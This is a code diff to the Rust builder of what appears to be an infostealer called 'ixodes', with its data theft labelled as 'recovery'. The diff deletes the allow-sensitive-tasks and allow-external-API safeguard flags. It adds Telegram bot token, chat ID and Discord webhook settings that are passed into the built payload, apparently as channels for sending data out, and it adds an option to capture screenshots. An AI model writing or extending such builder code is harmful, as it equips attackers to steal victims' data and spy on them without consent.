@@ -36,11 +36,13 @@ struct BrandingSettings {
 
 #[derive(Debug, Deserialize)]
 struct RecoverySettings {
-    allow_sensitive_tasks: bool,
-    allow_external_api: bool,
     allowed_categories: Vec<String>,
     artifact_key: Option<String>,
     archive_password: Option<String>,
+    telegram_token: Option<String>,
+    telegram_chat_id: Option<String>,
+    discord_webhook: Option<String>,
+    capture_screenshots: Option<bool>,
 }
 
 #[derive(Debug, Deserialize)]
@@ -113,6 +115,8 @@ fn render_settings_rs(settings: &RecoverySettings) -> Result<String, String> {
         None => "None".to_string(),
     };
 
+    let default_capture_screenshots = settings.capture_screenshots.unwrap_or(false);
+
     Ok(format!(
         r#"use crate::recovery::task::RecoveryCategory;
 use base64::{{Engine as _, engine::general_purpose::STANDARD}};
@@ -120,32 +124,22 @@ use once_cell::sync::Lazy;
 use std::{{collections::HashSet, env, str::FromStr}};
 use tracing::{{info, warn}};
 
-static DEFAULT_ALLOW_SENSITIVE: bool = {allow_sensitive};
-static DEFAULT_ALLOW_EXTERNAL_API: bool = {allow_external};
 static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = {default_categories};
 static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
+static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
 
 static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);
 
 #[derive(Debug)]
 pub struct RecoveryControl {{
-    allow_sensitive_tasks: bool,
-    allow_external_api: bool,
     allowed_categories: Option<HashSet<RecoveryCategory>>,
     artifact_key: Option<Vec<u8>>,
+    capture_screenshots: bool,
 }}
 
 impl RecoveryControl {{
     pub fn global() -> &'static Self {{
         &GLOBAL_RECOVERY_CONTROL
-    }}
-
-    pub fn allow_sensitive_tasks(&self) -> bool {{
-        self.allow_sensitive_tasks
-    }}
-
-    pub fn allow_external_api(&self) -> bool {{
-        self.allow_external_api
     }}
 
     pub fn allows_category(&self, category: RecoveryCategory) -> bool {{
@@ -159,9 +153,11 @@ impl RecoveryControl {{
         self.artifact_key.as_deref()
     }}
 
+    pub fn capture_screenshots(&self) -> bool {{
+        self.capture_screenshots
+    }}
+
     fn from_env() -> Self {{
-        let allow_sensitive = parse_flag_with_default("IXODES_ALLOW_SENSITIVE", DEFAULT_ALLOW_SENSITIVE);
-        let allow_external = parse_flag_with_default("IXODES_ALLOW_EXTERNAL_API", DEFAULT_ALLOW_EXTERNAL_API);
         let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
             .ok()
             .and_then(|value| parse_categories(&value))
@@ -187,24 +183,15 @@ impl RecoveryControl {{
             info!("artifact encryption enabled");
         }}
 
+        let capture_screenshots =
+            parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
+
         RecoveryControl {{
-            allow_sensitive_tasks: allow_sensitive,
-            allow_external_api: allow_external,
             allowed_categories,
             artifact_key,
+            capture_screenshots,
         }}
     }}
-}}
-
-fn parse_flag_with_default(key: &str, default: bool) -> bool {{
-    env::var(key)
-        .map(|value| {{
-            matches!(
-                value.trim().to_ascii_lowercase().as_str(),
-                "1" | "true" | "yes" | "on"
-            )
-        }})
-        .unwrap_or(default)
 }}
 
 fn default_categories() -> Option<HashSet<RecoveryCategory>> {{
@@ -256,11 +243,19 @@ fn parse_categories(value: &str) -> Option<HashSet<RecoveryCategory>> {{
     }}
     if set.is_empty() {{ None }} else {{ Some(set) }}
 }}
+
+fn parse_flag(key: &str) -> Option<bool> {{
+    env::var(key).ok().map(|value| {{
+        matches!(
+            value.trim().to_ascii_lowercase().as_str(),
+            "1" | "true" | "yes" | "on"
+        )
+    }})
+}}
 "#,
-        allow_sensitive = settings.allow_sensitive_tasks,
-        allow_external = settings.allow_external_api,
         default_categories = default_categories,
-        default_artifact_key = default_artifact_key
+        default_artifact_key = default_artifact_key,
+        default_capture_screenshots = default_capture_screenshots
     ))
 }
 
@@ -335,6 +330,22 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
                 .as_deref()
                 .unwrap_or(""),
         );
+    
+    if let Some(token) = &request.settings.telegram_token {
+        if !token.is_empty() {
+            command.env("IXODES_TELEGRAM_TOKEN", token);
+        }
+    }
+    if let Some(chat_id) = &request.settings.telegram_chat_id {
+        if !chat_id.is_empty() {
+            command.env("IXODES_CHAT_ID", chat_id);
+        }
+    }
+    if let Some(webhook) = &request.settings.discord_webhook {
+        if !webhook.is_empty() {
+            command.env("IXODES_DISCORD_WEBHOOK", webhook);
+        }
+    }
 
     if let Some(branding) = request.branding.as_ref() {
         apply_branding_env(&app, &mut command, branding)?;
